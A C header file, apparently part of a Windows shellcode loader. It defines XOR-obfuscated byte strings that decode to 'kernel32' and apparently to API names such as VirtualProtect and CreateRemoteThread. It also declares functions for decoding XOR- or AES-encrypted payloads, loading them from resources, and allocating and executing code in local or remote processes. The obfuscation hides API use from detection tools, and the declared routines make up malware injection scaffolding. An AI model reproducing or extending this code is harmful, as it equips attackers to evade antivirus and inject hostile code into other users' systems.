#if !defined(__UTILITY_H__)
#define __UTILITY_H__

    #define MAX_STRING 100

    #define OKAY    "[+]"
    #define INFO    "[*]"
    #define FAIL    "[!]"

    #define KK      {0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x66,0x61,0x63,0x69,0x6c,0x65}
    #define KN      {0x18,0x0d,0x17,0x02,0x09,0x0f,0x5c,0x56}
    #define VP      {0x25,0x01,0x17,0x18,0x19,0x02,0x03,0x34,0x17,0x09,0x15,0x06,0x0a,0x18}
    #define CT      {0x30,0x1a,0x00,0x0d,0x18,0x06,0x3b,0x0c,0x17,0x03,0x00,0x07}
    #define VPE     {0x25,0x01,0x17,0x18,0x19,0x02,0x03,0x34,0x17,0x09,0x15,0x06,0x0a,0x18,0x20,0x0b}
    #define CRT     {0x30,0x1a,0x00,0x0d,0x18,0x06,0x3d,0x01,0x08,0x09,0x15,0x06,0x3d,0x04,0x17,0x16,0x09,0x01}

    #define MESSAGE(X, ...) printf(X " " __VA_ARGS__)
    #define PRINT_ERROR(X) fprintf(stderr, FAIL " " #X " failed, error [x=0x%x,d=%lu] : %s somewhere in line[%d-%d]", GetLastError(), GetLastError(), __FILE__, __LINE__ - 3, __LINE__)

    typedef BOOL  (*VPPLAYER)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    
    int xorEncoding(PUCHAR code, DWORD codeSize, PUCHAR key, DWORD keySize, PUCHAR decoded);
    int getResourceAddr(LPVOID *resAddr, DWORD *resSize, int intResource);
    int allowAndExecuteRemote(HANDLE  processHandle, LPVOID remoteAddr, DWORD codeSize);
    int allowAndExecute(LPVOID codeAddr, DWORD codeSize);
    int allocateAndCopyRemote( HANDLE processHandle, LPVOID * remoteAddr, LPCVOID code, DWORD codeSize);
    int allocateAndCopy(LPVOID * remoteAddr, LPCVOID code, DWORD codeSize);
    int getAesImportedKey(ALG_ID aesAlgo, const BYTE* algoMode, LPVOID key, DWORD keySize, BYTE initializationVector[], HCRYPTKEY *keyHandle, HCRYPTPROV *cspHandle);

#endif // __UTILITY_H__